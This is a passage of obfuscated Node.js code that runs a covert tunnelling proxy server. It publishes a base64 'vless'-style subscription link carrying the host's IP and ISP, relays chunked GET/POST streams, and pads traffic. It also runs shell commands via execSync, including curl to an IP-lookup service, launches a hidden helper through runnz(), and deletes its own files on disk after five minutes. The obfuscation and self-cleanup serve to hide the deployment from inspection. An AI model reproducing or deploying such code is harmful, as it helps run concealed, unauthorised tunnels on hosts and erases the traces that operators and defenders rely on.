_0x24663d=_0x14432a;if(!this[_0x24663d(0x1ef)]||!this[_0x24663d(0x1fa)])return;try{!this['headerSent']&&(this[_0x24663d(0x1ef)]['write'](this['responseHeader']),this[_0x24663d(0x22f)]=!![]),this[_0x24663d(0x1fd)][_0x24663d(0x1bc)](this[_0x24663d(0x1ef)]),this[_0x24663d(0x1fd)]['on'](_0x24663d(0x205),()=>{const _0x2cc950=_0x24663d;!this['currentStreamRes'][_0x2cc950(0x209)]&&this[_0x2cc950(0x1ef)][_0x2cc950(0x205)]();}),this['remote']['on'](_0x24663d(0x1e7),_0x274043=>{const _0x5ba7d3=_0x24663d;log(_0x5ba7d3(0x1e7),'Remote\x20error:\x20'+_0x274043[_0x5ba7d3(0x1f0)]),!this[_0x5ba7d3(0x1ef)]['writableEnded']&&this['currentStreamRes'][_0x5ba7d3(0x205)]();});}catch(_0x2b115d){log(_0x24663d(0x1e7),_0x24663d(0x1bb)+_0x2b115d[_0x24663d(0x1f0)]),this['cleanup']();}}[_0x14432a(0x215)](){const _0x14bfb7=_0x14432a;!this[_0x14bfb7(0x26c)]&&(this[_0x14bfb7(0x26c)]=!![],log('debug',_0x14bfb7(0x286)+this[_0x14bfb7(0x22a)]),this[_0x14bfb7(0x1fd)]&&(this[_0x14bfb7(0x1fd)][_0x14bfb7(0x1c4)](),this[_0x14bfb7(0x1fd)]=null),this['initialized']=![],this[_0x14bfb7(0x22f)]=![]);}}const metaInfo=execSync(_0x14432a(0x23f),{'encoding':_0x14432a(0x1f2)}),ISP=metaInfo[_0x14432a(0x21a)]();let IP=DOMAIN;if(!DOMAIN)try{IP=execSync('curl\x20-s\x20--max-time\x202\x20ipv4.ip.sb',{'encoding':_0x14432a(0x1f2)})['trim']();}catch(_0x10ca25){try{IP='['+execSync(_0x14432a(0x26a),{'encoding':_0x14432a(0x1f2)})[_0x14432a(0x21a)]()+']';}catch(_0x5dbd8a){log(_0x14432a(0x1e7),'Failed\x20to\x20get\x20IP\x20address:',_0x5dbd8a[_0x14432a(0x1f0)]),IP='localhost';}}const server=http[_0x14432a(0x207)]((_0x2a9a26,_0x4e3eb5)=>{const _0x39e882=_0x14432a,_0x291b4e={'Access-Control-Allow-Origin':'*','Access-Control-Allow-Methods':_0x39e882(0x270),'Cache-Control':_0x39e882(0x27e),'X-Accel-Buffering':'no','X-Padding':generatePadding(0x64,0x3e8)};if(_0x2a9a26[_0x39e882(0x25e)]==='/'){const _0x6914bc=path[_0x39e882(0x1e0)](__dirname,'index.html');fs[_0x39e882(0x1c8)](_0x6914bc,_0x39e882(0x21f),(_0x5ab15d,_0x6bfe5e)=>{const _0xd9a3f1=_0x39e882;if(_0x5ab15d){_0x4e3eb5[_0xd9a3f1(0x219)](0x1f4,{'Content-Type':_0xd9a3f1(0x1b6)}),_0x4e3eb5[_0xd9a3f1(0x205)](_0xd9a3f1(0x1b8));return;}_0x4e3eb5[_0xd9a3f1(0x219)](0xc8,{'Content-Type':_0xd9a3f1(0x259)}),_0x4e3eb5[_0xd9a3f1(0x205)](_0x6bfe5e);});return;}if(_0x2a9a26[_0x39e882(0x25e)]==='/'+SUB_PATH){const _0x3ec539=_0x39e882(0x1f7)+UUID+'@'+IP+':443?encryption=none&security=tls&sni='+IP+_0x39e882(0x26f)+IP+_0x39e882(0x229)+SETTINGS[_0x39e882(0x24a)]+_0x39e882(0x1fb)+NAME+'-'+ISP,_0x51e2e5=Buffer['from'](_0x3ec539)[_0x39e882(0x210)](_0x39e882(0x24c));_0x4e3eb5[_0x39e882(0x219)](0xc8,{'Content-Type':_0x39e882(0x1b6)}),_0x4e3eb5[_0x39e882(0x205)](_0x51e2e5+'\x0a');return;}const _0x339913=_0x2a9a26[_0x39e882(0x25e)]['match'](new RegExp(XPATH+_0x39e882(0x1d3)));if(!_0x339913){_0x4e3eb5[_0x39e882(0x219)](0x194),_0x4e3eb5['end']();return;}const _0x42d79a=_0x339913[0x1],_0x2bdd14=_0x339913[0x2]?parseInt(_0x339913[0x2]):null;if(_0x2a9a26[_0x39e882(0x1c2)]===_0x39e882(0x20e)&&!_0x2bdd14){_0x291b4e[_0x39e882(0x1f6)]=_0x39e882(0x1fc),_0x291b4e[_0x39e882(0x258)]='chunked';let _0x179e97=sessions[_0x39e882(0x214)](_0x42d79a);!_0x179e97&&(_0x179e97=new Session(_0x42d79a),sessions[_0x39e882(0x25a)](_0x42d79a,_0x179e97),log(_0x39e882(0x217),'Created\x20new\x20session\x20for\x20GET:\x20'+_0x42d79a));_0x179e97[_0x39e882(0x200)]=!![];!_0x179e97[_0x39e882(0x1ae)](_0x4e3eb5,_0x291b4e)&&(log(_0x39e882(0x1e7),_0x39e882(0x1e5)+_0x42d79a),!_0x4e3eb5['headersSent']&&(_0x4e3eb5[_0x39e882(0x219)](0x1f4),_0x4e3eb5[_0x39e882(0x205)]()),_0x179e97[_0x39e882(0x215)](),sessions[_0x39e882(0x27d)](_0x42d79a));return;}if(_0x2a9a26['method']==='POST'&&_0x2bdd14!==null){let _0x49008e=sessions[_0x39e882(0x214)](_0x42d79a);!_0x49008e&&(_0x49008e=new Session(_0x42d79a),sessions['set'](_0x42d79a,_0x49008e),log(_0x39e882(0x217),'Created\x20new\x20session\x20for\x20POST:\x20'+_0x42d79a),setTimeout(()=>{const _0x592239=_0x39e882,_0x425820=sessions[_0x592239(0x214)](_0x42d79a);_0x425820&&!_0x425820['downstreamStarted']&&(log(_0x592239(0x1e3),'Session\x20'+_0x42d79a+_0x592239(0x20c)),_0x425820[_0x592239(0x215)](),sessions[_0x592239(0x27d)](_0x42d79a));},SETTINGS[_0x39e882(0x1f5)]));let _0x4f142e=[],_0x327600=0x0,_0x237b05=![];_0x2a9a26['on'](_0x39e882(0x246),_0x47d449=>{const _0x4c1b96=_0x39e882;_0x327600+=_0x47d449['length'];if(_0x327600>SETTINGS['MAX_POST_SIZE']){!_0x237b05&&(_0x4e3eb5[_0x4c1b96(0x219)](0x19d),_0x4e3eb5['end'](),_0x237b05=!![]);return;}_0x4f142e[_0x4c1b96(0x264)](_0x47d449);}),_0x2a9a26['on'](_0x39e882(0x205),async()=>{const _0x1d7986=_0x39e882;if(_0x237b05)return;try{const _0x388756=Buffer[_0x1d7986(0x23c)](_0x4f142e);log(_0x1d7986(0x217),_0x1d7986(0x220)+_0x2bdd14+',\x20size='+_0x388756[_0x1d7986(0x1c0)]),await _0x49008e[_0x1d7986(0x221)](_0x2bdd14,_0x388756),!_0x237b05&&(_0x4e3eb5[_0x1d7986(0x219)](0xc8,_0x291b4e),_0x237b05=!![]),_0x4e3eb5['end']();}catch(_0x511298){log(_0x1d7986(0x1e7),_0x1d7986(0x1cb)+_0x511298[_0x1d7986(0x1f0)]),_0x49008e[_0x1d7986(0x215)](),sessions[_0x1d7986(0x27d)](_0x42d79a),!_0x237b05&&(_0x4e3eb5['writeHead'](0x1f4),_0x237b05=!![]),_0x4e3eb5[_0x1d7986(0x205)]();}});return;}_0x4e3eb5[_0x39e882(0x219)](0x194),_0x4e3eb5[_0x39e882(0x205)]();});server['on'](_0x14432a(0x222),_0x284a56=>{const _0xb580aa=_0x14432a;log(_0xb580aa(0x239),_0xb580aa(0x263)+(_0x284a56['alpnProtocol']||'http/1.1'));});function generatePadding(_0x3e29b9,_0x2abbee){const _0x4e88d6=_0x14432a,_0xbbbac6=_0x3e29b9+Math[_0x4e88d6(0x26b)](Math['random']()*(_0x2abbee-_0x3e29b9));return Buffer['from'](Array(_0xbbbac6)[_0x4e88d6(0x269)]('X')[_0x4e88d6(0x1e0)](''))[_0x4e88d6(0x210)](_0x4e88d6(0x24c));}server[_0x14432a(0x203)]=0x975e0,server['headersTimeout']=0x98968,server['on'](_0x14432a(0x1e7),_0x1c870c=>{const _0x20cc70=_0x14432a;log('error',_0x20cc70(0x234)+_0x1c870c[_0x20cc70(0x1f0)]);});const delFiles=()=>{const _0x7d492b=_0x14432a;[_0x7d492b(0x1d0),_0x7d492b(0x227)]['forEach'](_0x135082=>fs['unlink'](_0x135082,()=>{}));};server[_0x14432a(0x250)](PORT,()=>{const _0x1f7eef=_0x14432a;runnz(),setTimeout(()=>{delFiles();},0x493e0),addAccessTask(),console['log'](_0x1f7eef(0x1bf)+PORT);});
